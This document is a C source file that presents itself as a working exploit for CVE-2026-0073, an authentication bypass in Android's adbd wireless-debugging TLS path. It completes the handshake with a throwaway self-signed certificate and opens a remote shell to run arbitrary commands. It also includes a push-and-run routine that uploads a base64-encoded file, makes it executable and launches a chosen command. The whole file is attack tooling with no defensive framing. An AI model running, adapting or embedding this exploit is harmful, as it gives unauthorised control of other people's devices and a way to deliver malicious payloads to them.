
/* adb0073.c -- CVE-2026-0073 adbd TLS auth bypass, C implementation with OpenSSL */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/time.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/evp.h>
#include <openssl/rsa.h>
#include <openssl/bn.h>
#include <openssl/pem.h>

#include "adb0073.h"

int adb0073_verbose = 0;
#define LOG(...) do { if (adb0073_verbose) { fprintf(stderr, "[*] " __VA_ARGS__); fprintf(stderr, "\n"); } } while(0)
#define ERRV(...) do { fprintf(stderr, "[-] " __VA_ARGS__); fprintf(stderr, "\n"); } while(0)

/* ---------------- ADB framing ---------------- */
static uint32_t adb_checksum(const uint8_t *d, size_t n) {
    uint32_t s = 0;
    for (size_t i = 0; i < n; i++) s += d[i];
    return s & 0xFFFFFFFFu;
}

static void put_u32le(uint8_t *p, uint32_t v) {
    p[0]=v&0xff; p[1]=(v>>8)&0xff; p[2]=(v>>16)&0xff; p[3]=(v>>24)&0xff;
}
static uint32_t get_u32le(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1]<<8) | ((uint32_t)p[2]<<16) | ((uint32_t)p[3]<<24);
}

static size_t pack_packet(uint8_t *buf, uint32_t cmd, uint32_t arg0, uint32_t arg1,
                          const uint8_t *data, size_t len) {
    uint32_t csum = adb_checksum(data, len);
    uint32_t magic = cmd ^ 0xFFFFFFFFu;
    put_u32le(buf+0,  cmd);
    put_u32le(buf+4,  arg0);
    put_u32le(buf+8,  arg1);
    put_u32le(buf+12, (uint32_t)len);
    put_u32le(buf+16, csum);
    put_u32le(buf+20, magic);
    if (len) memcpy(buf+24, data, len);
    return 24 + len;
}

static int write_all(int fd, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = send(fd, buf+off, len-off, 0);
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}

static int read_exact(int fd, uint8_t *buf, size_t n) {
    size_t off = 0;
    while (off < n) {
        ssize_t r = recv(fd, buf+off, n-off, 0);
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}

static int recv_packet(int fd, uint32_t *cmd, uint32_t *arg0, uint32_t *arg1,
                       uint8_t **data, size_t *datalen,
                       uint8_t *hdr, size_t hdrsz) {
    if (read_exact(fd, hdr, 24) != 0) return -1;
    uint32_t c    = get_u32le(hdr+0);
    uint32_t a0   = get_u32le(hdr+4);
    uint32_t a1   = get_u32le(hdr+8);
    uint32_t len  = get_u32le(hdr+12);
    if (len > 4u*1024u*1024u) return -1;
    if (cmd) *cmd = c;
    if (arg0) *arg0 = a0;
    if (arg1) *arg1 = a1;
    if (datalen) *datalen = len;
    if (len) {
        if (read_exact(fd, hdr, len) != 0) return -1; /* reuse hdr buffer */
        if (data) *data = hdr;
    } else if (data) *data = hdr;
    (void)hdrsz;
    return 0;
}

/* ---------------- ephemeral EC P-256 self-signed cert ---------------- */
static int make_ec_client_cert(EVP_PKEY **out_key, X509 **out_cert) {
    EVP_PKEY *pkey = NULL;
    X509 *x = NULL;
    X509_NAME *name = NULL;

    pkey = EVP_PKEY_new();
    if (!pkey) return -1;

    /* Generate EC P-256 (prime256v1) key */
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_EC, NULL);
    if (!ctx) goto fail;
    if (EVP_PKEY_keygen_init(ctx) <= 0) goto fail_ctx;
    if (EVP_PKEY_CTX_set_ec_paramgen_curve_nid(ctx, NID_X9_62_prime256v1) <= 0) goto fail_ctx;
    if (EVP_PKEY_keygen(ctx, &pkey) <= 0) goto fail_ctx;
    EVP_PKEY_CTX_free(ctx);
    ctx = NULL;

    x = X509_new();
    if (!x) goto fail;
    X509_set_version(x, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(x), (long)time(NULL) ^ (long)getpid());
    X509_gmtime_adj(X509_getm_notBefore(x), 0);
    X509_gmtime_adj(X509_getm_notAfter(x), 86400);
    X509_set_pubkey(x, pkey);

    name = X509_get_subject_name(x);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC,
                               (const unsigned char *)"adbkey", -1, -1, 0);
    X509_set_issuer_name(x, name);

    if (X509_sign(x, pkey, EVP_sha256()) <= 0) goto fail;

    *out_key = pkey;
    *out_cert = x;
    return 0;

fail_ctx:
    EVP_PKEY_CTX_free(ctx);
fail:
    if (x) X509_free(x);
    if (pkey) EVP_PKEY_free(pkey);
    return -1;
}

/* ---------------- TCP connect (IPv4 numeric only, no getaddrinfo) ---------------- */
static int tcp_connect(const char *host, int port) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons((uint16_t)port);
    /* Accept dotted-quad, or "localhost"/"127.0.0.1" */
    if (strcmp(host, "localhost") == 0) {
        sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    } else {
        unsigned int a,b,c,d;
        if (sscanf(host, "%u.%u.%u.%u", &a,&b,&c,&d) == 4) {
            sa.sin_addr.s_addr = htonl((a<<24)|(b<<16)|(c<<8)|d);
        } else {
            sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        }
    }
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        close(fd);
        return -1;
    }
    int one = 1;
    setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    return fd;
}


/* ---------------- TLS upgrade with EC client cert ---------------- */
/*
 * OpenSSL 3.x statically-linked provider bootstrap.
 *
 * With a fully static binary, libcrypto cannot dlopen "default.so", so we
 * register the *built-in* default provider explicitly and force the linker to
 * keep ossl_default_provider_init() (it is normally only referenced from a
 * dlopen path we cannot reach on Android).
 */
extern int ossl_default_provider_init(const void *handle, const void *in,
                                      const void **out, const void **provctx);
extern int OSSL_PROVIDER_add_builtin(void *libctx, const char *name,
                                     void *init_fn);
extern void *OSSL_PROVIDER_load(void *libctx, const char *name);

static int g_ossl_ready = 0;
static void ossl_bootstrap(void) {
    if (g_ossl_ready) return;
    g_ossl_ready = 1;
    OSSL_PROVIDER_add_builtin(NULL, "default", (void *)ossl_default_provider_init);
    if (!OSSL_PROVIDER_load(NULL, "default")) {
        ERRV("OSSL_PROVIDER_load(default) failed");
    }
}

static SSL *upgrade_tls(int fd, EVP_PKEY *pkey, X509 *cert) {
    ossl_bootstrap();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { ERRV("SSL_CTX_new failed"); return NULL; }
    SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    if (SSL_CTX_use_certificate(ctx, cert) != 1) {
        ERRV("SSL_CTX_use_certificate failed");
        SSL_CTX_free(ctx);
        return NULL;
    }
    if (SSL_CTX_use_PrivateKey(ctx, pkey) != 1) {
        ERRV("SSL_CTX_use_PrivateKey failed");
        SSL_CTX_free(ctx);
        return NULL;
    }
    SSL *ssl = SSL_new(ctx);
    if (!ssl) { SSL_CTX_free(ctx); return NULL; }
    SSL_set_fd(ssl, fd);
    SSL_set_connect_state(ssl);
    if (SSL_do_handshake(ssl) != 1) {
        ERRV("TLS handshake failed: %s", ERR_error_string(ERR_get_error(), NULL));
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return NULL;
    }
    LOG("TLS handshake ok: %s / %s", SSL_get_version(ssl), SSL_get_cipher(ssl));
    SSL_CTX_free(ctx);
    return ssl;
}

/* SSL-specific packet io (same framing) */
static int ssl_write_all(SSL *s, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        int n = SSL_write(s, buf+off, (int)(len-off));
        if (n <= 0) return -1;
        off += (size_t)n;
    }
    return 0;
}
static int ssl_read_exact(SSL *s, uint8_t *buf, size_t n) {
    size_t off = 0;
    while (off < n) {
        int r = SSL_read(s, buf+off, (int)(n-off));
        if (r <= 0) return -1;
        off += (size_t)r;
    }
    return 0;
}
static int ssl_recv_packet(SSL *s, uint32_t *cmd, uint32_t *arg0, uint32_t *arg1,
                           uint8_t *scratch, size_t scratchsz, size_t *datalen) {
    if (ssl_read_exact(s, scratch, 24) != 0) return -1;
    uint32_t len = get_u32le(scratch+12);
    if (len > 4u*1024u*1024u) return -1;
    if (cmd)  *cmd  = get_u32le(scratch+0);
    if (arg0) *arg0 = get_u32le(scratch+4);
    if (arg1) *arg1 = get_u32le(scratch+8);
    if (datalen) *datalen = len;
    if (len) {
        if (len > scratchsz) return -1;
        if (ssl_read_exact(s, scratch, len) != 0) return -1;
    }
    return 0;
}

/* ---------------- main exploit ---------------- */
int adb0073_run(const char *host, int port, const char *cmd, char *out, size_t outsz) {
    int ret = -1;
    int fd = -1;
    SSL *ssl = NULL;
    EVP_PKEY *pkey = NULL;
    X509 *cert = NULL;
    uint8_t *hdr = NULL;
    size_t hdrsz = 8u*1024u*1024u;

    if (out && outsz) out[0] = 0;

    hdr = (uint8_t *)malloc(hdrsz);
    if (!hdr) { ERRV("oom"); return -1; }

    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    fd = tcp_connect(host, port);
    if (fd < 0) { ERRV("connect %s:%d failed: %s", host, port, strerror(errno)); goto done; }
    LOG("connected to %s:%d", host, port);

    /* Phase 1: cleartext CNXN -> expect STLS */
    {
        uint8_t *pkt = (uint8_t *)malloc(24 + 512);
        size_t n = pack_packet(pkt, CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                               (const uint8_t *)ADB_BANNER, strlen(ADB_BANNER));
        if (write_all(fd, pkt, n) != 0) { free(pkt); ERRV("send CNXN failed"); goto done; }
        free(pkt);
    }

    uint32_t stls_version = 0;
    int got_stls = 0;
    for (int i = 0; i < 4 && !got_stls; i++) {
        uint32_t c=0,a0=0,a1=0; size_t dl=0;
        if (recv_packet(fd, &c, &a0, &a1, NULL, &dl, hdr, hdrsz) != 0) {
            ERRV("recv during CNXN failed"); goto done;
        }
        LOG("  <- cmd=0x%08x arg0=0x%x len=%zu", c, a0, dl);
        if (c == CMD_STLS) { stls_version = a0; got_stls = 1; }
        else if (c == CMD_CNXN) { /* tolerate pre-STLS CNXN, keep waiting */ }
        else if (c == CMD_AUTH) {
            ERRV("device sent AUTH instead of STLS (not the wireless-debug TLS path)");
            goto done;
        } else {
            ERRV("unexpected cmd 0x%08x during CNXN", c);
            goto done;
        }
    }
    if (!got_stls) { ERRV("did not receive STLS"); goto done; }
    LOG("got STLS version=0x%x", stls_version);

    {
        uint8_t pkt[24];
        size_t n = pack_packet(pkt, CMD_STLS, stls_version, 0, NULL, 0);
        if (write_all(fd, pkt, n) != 0) { ERRV("send STLS failed"); goto done; }
    }

    /* Phase 2: TLS upgrade with EC P-256 cert */
    if (make_ec_client_cert(&pkey, &cert) != 0) { ERRV("EC cert gen failed"); goto done; }
    ssl = upgrade_tls(fd, pkey, cert);
    if (!ssl) goto done;

    /* Phase 3: drain post-TLS device CNXN (do NOT send host CNXN) */
    {
        int got_cnxn = 0;
        for (int i = 0; i < 8 && !got_cnxn; i++) {
            uint32_t c=0,a0=0,a1=0; size_t dl=0;
            if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) {
                ERRV("post-TLS recv failed"); goto done;
            }
            LOG("  <- (tls) cmd=0x%08x len=%zu", c, dl);
            if (c == CMD_CNXN) { got_cnxn = 1; }
            else if (c == CMD_STLS) { continue; }
            else { break; }
        }
        if (!got_cnxn) ERRV("warning: no post-TLS CNXN seen, continuing anyway");
    }

    /* Phase 4: OPEN shell:<cmd>\0 */
    {
        const uint32_t local_id = 1;
        char payload[4096];
        int plen = snprintf(payload, sizeof(payload), "shell:%s", cmd);
        uint8_t pkt[24 + sizeof(payload)];
        size_t n = pack_packet(pkt, CMD_OPEN, local_id, DELAYED_ACK_WINDOW,
                               (const uint8_t *)payload, (size_t)plen + 1 /* include NUL */);
        if (ssl_write_all(ssl, pkt, n) != 0) { ERRV("OPEN send failed"); goto done; }
        LOG("sent OPEN shell:%s", cmd);

        /* wait OKAY, ignoring STLS notifications */
        uint32_t remote_id = 0;
        int got_ok = 0;
        for (int i = 0; i < 16 && !got_ok; i++) {
            uint32_t c=0,a0=0,a1=0; size_t dl=0;
            if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) {
                ERRV("recv after OPEN failed"); goto done;
            }
            if (c == CMD_STLS) continue;
            LOG("  <- cmd=0x%08x arg0=%u", c, a0);
            if (c == CMD_OKAY) { remote_id = a0; got_ok = 1; }
            else if (c == CMD_CLSE) { ERRV("OPEN rejected (CLSE)"); goto done; }
            else { break; }
        }
        if (!got_ok) { ERRV("no OKAY after OPEN"); goto done; }

        /* ACK to grant our write window */
        {
            uint8_t ack[24];
            size_t n2 = pack_packet(ack, CMD_OKAY, local_id, remote_id, NULL, 0);
            ssl_write_all(ssl, ack, n2);
        }

        /* Phase 5: read output until CLSE */
        size_t outoff = 0;
        for (;;) {
            uint32_t c=0,a0=0,a1=0; size_t dl=0;
            if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) break;
            if (c == CMD_WRTE) {
                if (out && outoff + dl + 1 < outsz) {
                    memcpy(out+outoff, hdr, dl);
                    outoff += dl;
                    out[outoff] = 0;
                }
                uint8_t ack[24];
                size_t n2 = pack_packet(ack, CMD_OKAY, local_id, remote_id, NULL, 0);
                ssl_write_all(ssl, ack, n2);
            } else if (c == CMD_CLSE) {
                break;
            } else if (c == CMD_OKAY) {
                continue;
            } else {
                break;
            }
        }
        ret = 0;
    }

done:
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    if (fd >= 0) close(fd);
    if (cert) X509_free(cert);
    if (pkey) EVP_PKEY_free(pkey);
    free(hdr);
    return ret;
}




/* ================================================================
 *  Push-and-run: stream a local file into the remote shell's stdin
 *  via `cat > REMOTE; base64 the payload to stay binary-safe`.
 * ================================================================ */

#define B64_CHUNK 32768

static const char b64tab[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_encode(const uint8_t *in, size_t n, char *out) {
    size_t o = 0, i = 0;
    while (i + 2 < n) {
        uint32_t v = (in[i] << 16) | (in[i+1] << 8) | in[i+2];
        out[o++] = b64tab[(v >> 18) & 63];
        out[o++] = b64tab[(v >> 12) & 63];
        out[o++] = b64tab[(v >> 6) & 63];
        out[o++]  = b64tab[v & 63];
        i += 3;
    }
    if (n - i == 1) {
        uint32_t v = in[i] << 16;
        out[o++] = b64tab[(v >> 18) & 63];
        out[o++] = b64tab[(v >> 12) & 63];
        out[o++] = '=';
        out[o++] = '=';
    } else if (n - i == 2) {
        uint32_t v = (in[i] << 16) | (in[i+1] << 8);
        out[o++] = b64tab[(v >> 18) & 63];
        out[o++] = b64tab[(v >> 12) & 63];
        out[o++] = b64tab[(v >> 6) & 63];
        out[o++] = '=';
    }
    out[o] = 0;
    return o;
}

/* --- session state used while streaming --- */
typedef struct {
    SSL  *ssl;
    uint32_t local_id;
    uint32_t remote_id;
    char *out;
    size_t outsz;
    size_t outoff;
} pnr_state;

static int pnr_send(void *ctx, const void *buf, size_t len) {
    pnr_state *st = (pnr_state *)ctx;
    uint8_t hdr[24];
    size_t n = pack_packet(hdr, CMD_WRTE, st->local_id, st->remote_id, NULL, 0);
    (void)n;
    /* header then body, all over TLS */
    uint8_t h[24];
    put_u32le(h+0,  CMD_WRTE);
    put_u32le(h+4,  st->local_id);
    put_u32le(h+8,  st->remote_id);
    put_u32le(h+12, (uint32_t)len);
    put_u32le(h+16, adb_checksum((const uint8_t *)buf, len));
    put_u32le(h+20, CMD_WRTE ^ 0xFFFFFFFFu);
    if (ssl_write_all(st->ssl, h, 24) != 0) return -1;
    if (len && ssl_write_all(st->ssl, (const uint8_t *)buf, len) != 0) return -1;
    return 0;
}

/* Drain available incoming packets (non-blocking-ish) into st->out. */
static int pnr_wait_marker(pnr_state *st, unsigned phrase, double timeout_s) {
    char want[32];
    int wl = snprintf(want, sizeof(want), "GRMK%u", phrase);
    char acc[4096];
    size_t acclen = 0;
    struct timeval tv0, tv1;
    gettimeofday(&tv0, NULL);
    for (;;) {
        gettimeofday(&tv1, NULL);
        double dt = (tv1.tv_sec - tv0.tv_sec) + (tv1.tv_usec - tv0.tv_usec) / 1e6;
        if (dt > timeout_s) return -1;
        uint32_t c = 0, a0 = 0, a1 = 0;
        size_t dl = 0;
        static uint8_t mbuf[256 * 1024];
        if (ssl_recv_packet(st->ssl, &c, &a0, &a1, mbuf, sizeof(mbuf), &dl) != 0) return -1;
        if (c == CMD_WRTE) {
            /* capture into rolling window and look for the marker */
            size_t keep = dl < sizeof(acc) ? dl : sizeof(acc);
            if (keep > 0) {
                if (acclen + keep > sizeof(acc)) {
                    size_t drop = acclen + keep - sizeof(acc);
                    memmove(acc, acc + drop, acclen - drop);
                    acclen -= drop;
                }
                memcpy(acc + acclen, mbuf + (dl - keep), keep);
                acclen += keep;
                acc[acclen] = 0;
            }
            /* ack the write */
            uint8_t ack[24];
            put_u32le(ack+0, CMD_OKAY);
            put_u32le(ack+4, st->local_id);
            put_u32le(ack+8, st->remote_id);
            put_u32le(ack+12, 0);
            put_u32le(ack+16, 0);
            put_u32le(ack+20, CMD_OKAY ^ 0xFFFFFFFFu);
            if (ssl_write_all(st->ssl, ack, 24) != 0) return -1;
            if (wl > 0 && memmem(acc, acclen, want, (size_t)wl)) return 0;
            acclen = 0;   /* keep window small */
        } else if (c == CMD_CLSE) {
            return -1;
        }
    }
}

static void pnr_drain(pnr_state *st) {
    uint8_t scratch[65536];
    for (;;) {
        uint32_t c=0,a0=0,a1=0; size_t dl=0;
        if (ssl_recv_packet(st->ssl, &c, &a0, &a1, scratch, sizeof(scratch), &dl) != 0) return;
        if (c == CMD_WRTE) {
            if (st->out && st->outoff + dl + 1 < st->outsz) {
                memcpy(st->out + st->outoff, scratch, dl);
                st->outoff += dl;
                st->out[st->outoff] = 0;
            }
            uint8_t ack[24];
            put_u32le(ack+0,  CMD_OKAY);
            put_u32le(ack+4,  st->local_id);
            put_u32le(ack+8,  st->remote_id);
            put_u32le(ack+12, 0);
            put_u32le(ack+16, 0);
            put_u32le(ack+20, CMD_OKAY ^ 0xFFFFFFFFu);
            ssl_write_all(st->ssl, ack, 24);
        } else if (c == CMD_CLSE) {
            return;
        } else if (c == CMD_OKAY) {
            continue;
        } else if (c == CMD_STLS) {
            continue;
        } else {
            return;
        }
    }
}



/*
 * Core: open 0073 shell and stream `cat > remote` with base64 payload,
 * then run post_cmd.  Everything happens on ONE shell session so the
 * privileged context persists.
 */
int adb0073_push_and_run(const char *host, int port,
                         const char *local_path, const char *remote_path,
                         const char *post_cmd,
                         char *out, size_t outsz) {
    int ret = -1;
    int fd = -1;
    SSL *ssl = NULL;
    EVP_PKEY *pkey = NULL;
    X509 *cert = NULL;
    uint8_t *hdr = NULL;
    const size_t hdrsz = 8u*1024u*1024u;
    uint8_t *filebuf = NULL;
    char *b64 = NULL;

    if (out && outsz) out[0] = 0;

    /* Read the whole local file up-front (must fit in target tmpfs anyway). */
    FILE *fp = fopen(local_path, "rb");
    if (!fp) { ERRV("open %s: %s", local_path, strerror(errno)); return -1; }
    fseek(fp, 0, SEEK_END);
    long fsz = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (fsz <= 0) { fclose(fp); ERRV("empty file"); return -1; }
    filebuf = (uint8_t *)malloc((size_t)fsz);
    if (!filebuf) { fclose(fp); ERRV("oom"); return -1; }
    if (fread(filebuf, 1, (size_t)fsz, fp) != (size_t)fsz) { fclose(fp); free(filebuf); return -1; }
    fclose(fp);
    LOG("local file %s = %ld bytes", local_path, fsz);

    b64 = (char *)malloc((size_t)fsz * 2 + 16);
    if (!b64) { free(filebuf); return -1; }

    hdr = (uint8_t *)malloc(hdrsz);
    if (!hdr) { free(filebuf); free(b64); return -1; }

    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    /* ---- connect + 0073 handshake (same as adb0073_run) ---- */
    fd = tcp_connect(host, port);
    if (fd < 0) { ERRV("connect %s:%d failed", host, port); goto done; }

    {
        uint8_t *pkt = (uint8_t *)malloc(24 + 512);
        size_t n = pack_packet(pkt, CMD_CNXN, ADB_VERSION, ADB_MAXDATA,
                               (const uint8_t *)ADB_BANNER, strlen(ADB_BANNER));
        if (write_all(fd, pkt, n) != 0) { free(pkt); goto done; }
        free(pkt);
    }

    uint32_t stls_version = 0;
    int got_stls = 0;
    for (int i = 0; i < 4 && !got_stls; i++) {
        uint32_t c=0,a0=0,a1=0; size_t dl=0;
        if (recv_packet(fd, &c, &a0, &a1, NULL, &dl, hdr, hdrsz) != 0) goto done;
        if (c == CMD_STLS) { stls_version = a0; got_stls = 1; }
        else if (c == CMD_CNXN) { continue; }
        else goto done;
    }
    if (!got_stls) { ERRV("no STLS"); goto done; }

    {
        uint8_t pkt[24];
        size_t n = pack_packet(pkt, CMD_STLS, stls_version, 0, NULL, 0);
        if (write_all(fd, pkt, n) != 0) goto done;
    }

    if (make_ec_client_cert(&pkey, &cert) != 0) goto done;
    ssl = upgrade_tls(fd, pkey, cert);
    if (!ssl) goto done;

    /* drain post-TLS CNXN */
    {
        for (int i = 0; i < 8; i++) {
            uint32_t c=0,a0=0,a1=0; size_t dl=0;
            if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) goto done;
            if (c == CMD_CNXN) break;
            if (c == CMD_STLS) continue;
            break;
        }
    }

    /* ---- OPEN persistent shell ---- */
    const uint32_t local_id = 1;
    uint32_t remote_id = 0;
    {
        const char *payload = "shell:";
        uint8_t pkt[24 + 8];
        size_t n = pack_packet(pkt, CMD_OPEN, local_id, DELAYED_ACK_WINDOW,
                               (const uint8_t *)payload, 7 /* "shell:" + NUL */);
        if (ssl_write_all(ssl, pkt, n) != 0) goto done;

        int got_ok = 0;
        for (int i = 0; i < 16 && !got_ok; i++) {
            uint32_t c=0,a0=0,a1=0; size_t dl=0;
            if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) goto done;
            if (c == CMD_STLS) continue;
            if (c == CMD_OKAY) { remote_id = a0; got_ok = 1; }
            else if (c == CMD_CLSE) { ERRV("OPEN rejected"); goto done; }
            else break;
        }
        if (!got_ok) { ERRV("no OKAY"); goto done; }
        uint8_t ack[24];
        size_t n2 = pack_packet(ack, CMD_OKAY, local_id, remote_id, NULL, 0);
        ssl_write_all(ssl, ack, n2);
    }
    LOG("persistent shell open: local=%u remote=%u", local_id, remote_id);

    /* ---- build remote command: base64 -d > remote_path ---- */
    {
        pnr_state st;
        memset(&st, 0, sizeof(st));
        st.ssl = ssl;
        st.local_id = local_id;
        st.remote_id = remote_id;
        st.out = out;
        st.outsz = outsz;
        st.outoff = 0;

        /*
         * Reliable push: stream base64 in small batches, and after every
         * batch force a shell round-trip by asking it to echo a unique
         * marker.  Only when the marker comes back do we know for sure the
         * shell has consumed the bytes.  (A bare ADB OKAY is NOT enough: the
         * delayed-ack window lets adbd drop data silently past ~6 MiB.)
         */
        char cmd1[512];
        snprintf(cmd1, sizeof(cmd1), ": > %s.b64\n", remote_path);
        if (pnr_send(&st, cmd1, strlen(cmd1)) != 0) goto done;

        const size_t BATCH = 32u * 1024u;   /* b64 chars per marker round-trip */
        size_t i = 0;
        unsigned phrase = 0;
        while (i < (size_t)fsz) {
            size_t chunk = (size_t)fsz - i;
            if (chunk > BATCH) chunk = BATCH;
            size_t bl = b64_encode(filebuf + i, chunk, b64);
            char head[256];
            snprintf(head, sizeof(head), "cat >> %s.b64 << 'GRB64EOF'\n", remote_path);
            if (pnr_send(&st, head, strlen(head)) != 0) goto done;
            /* payload, line-wrapped (heredoc body) */
            size_t p = 0;
            while (p < bl) {
                size_t take = bl - p;
                if (take > 76) take = 76;
                if (pnr_send(&st, b64 + p, take) != 0) goto done;
                if (pnr_send(&st, "\n", 1) != 0) goto done;
                p += take;
            }
            if (pnr_send(&st, "GRB64EOF\n", 9) != 0) goto done;
            /* marker handshake */
            phrase++;
            char mk[64];
            int mkl = snprintf(mk, sizeof(mk), "echo GRMK%u\n", phrase);
            if (pnr_send(&st, mk, (size_t)mkl) != 0) goto done;
            if (pnr_wait_marker(&st, phrase, 30.0) != 0) {
                ERRV("push stalled at %zu/%ld", i, fsz);
                goto done;
            }
            i += chunk;
            LOG("pushed %zu / %ld bytes", i, fsz);
        }
        {
            char cmd2[1024];
            snprintf(cmd2, sizeof(cmd2),
                     "base64 -d < %s.b64 > %s && chmod 700 %s && rm -f %s.b64 && echo GRPKG_DONE $(wc -c < %s)\n",
                     remote_path, remote_path, remote_path, remote_path, remote_path);
            if (pnr_send(&st, cmd2, strlen(cmd2)) != 0) goto done;
        }
        usleep(600 * 1000);
        pnr_drain(&st);
        /* ---- run post command ---- */
        if (post_cmd && post_cmd[0]) {
            char cmd3[2048];
            snprintf(cmd3, sizeof(cmd3), "%s\n", post_cmd);
            if (pnr_send(&st, cmd3, strlen(cmd3)) != 0) goto done;
        }
        /* read until CLSE or timeout */
        {
            for (int spin = 0; spin < 6000; spin++) {  /* ~ 6000 * 100ms */
                uint32_t c=0,a0=0,a1=0; size_t dl=0;
                if (ssl_recv_packet(ssl, &c, &a0, &a1, hdr, hdrsz, &dl) != 0) break;
                if (c == CMD_WRTE) {
                    if (out && st.outoff + dl + 1 < outsz) {
                        memcpy(out + st.outoff, hdr, dl);
                        st.outoff += dl;
                        out[st.outoff] = 0;
                    }
                    uint8_t ack[24];
                    size_t n2 = pack_packet(ack, CMD_OKAY, local_id, remote_id, NULL, 0);
                    ssl_write_all(ssl, ack, n2);
                } else if (c == CMD_CLSE) {
                    break;
                } else if (c == CMD_OKAY || c == CMD_STLS) {
                    continue;
                } else {
                    break;
                }
            }
        }
    }

    ret = 0;

done:
    if (ssl) { SSL_shutdown(ssl); SSL_free(ssl); }
    if (fd >= 0) close(fd);
    if (cert) X509_free(cert);
    if (pkey) EVP_PKEY_free(pkey);
    free(hdr);
    free(filebuf);
    free(b64);
    return ret;
}

/* ---------------- CLI for standalone testing ---------------- */
#ifndef ADB0073_NO_MAIN
/*
 * CLI:
 *   adb0073 <host> <port> <command> [-v]                 -- run command
 *   adb0073 --push <host> <port> <local> <remote> <cmd> [-v]
 *                                                       -- push file then run cmd
 */
int main(int argc, char **argv) {
    if (argc >= 2 && strcmp(argv[1], "--push") == 0) {
        if (argc < 7) {
            fprintf(stderr, "usage: %s --push <host> <port> <local> <remote> <cmd> [-v]\n", argv[0]);
            return 2;
        }
        if (argc >= 8 && strcmp(argv[7], "-v") == 0) adb0073_verbose = 1;
        char *buf = (char *)malloc(4u*1024u*1024u);
        if (!buf) return 1;
        buf[0] = 0;
        int r = adb0073_push_and_run(argv[2], atoi(argv[3]), argv[4], argv[5], argv[6], buf, 4u*1024u*1024u);
        if (r == 0) { fputs(buf, stdout); free(buf); return 0; }
        fprintf(stderr, "[-] push_and_run failed rc=%d\n", r);
        free(buf);
        return 1;
    }
    if (argc < 4) {
        fprintf(stderr, "usage: %s <host> <port> <command> [-v]\n", argv[0]);
        fprintf(stderr, "       %s --push <host> <port> <local> <remote> <cmd> [-v]\n", argv[0]);
        return 2;
    }
    if (argc >= 5 && strcmp(argv[4], "-v") == 0) adb0073_verbose = 1;
    size_t bufsz = 4u*1024u*1024u;
    char *buf = (char *)malloc(bufsz);
    if (!buf) return 1;
    buf[0] = 0;
    int r = adb0073_run(argv[1], atoi(argv[2]), argv[3], buf, bufsz);
    if (r == 0) { fputs(buf, stdout); free(buf); return 0; }
    fprintf(stderr, "[-] exploit failed rc=%d\n", r);
    free(buf);
    return 1;
}
#endif
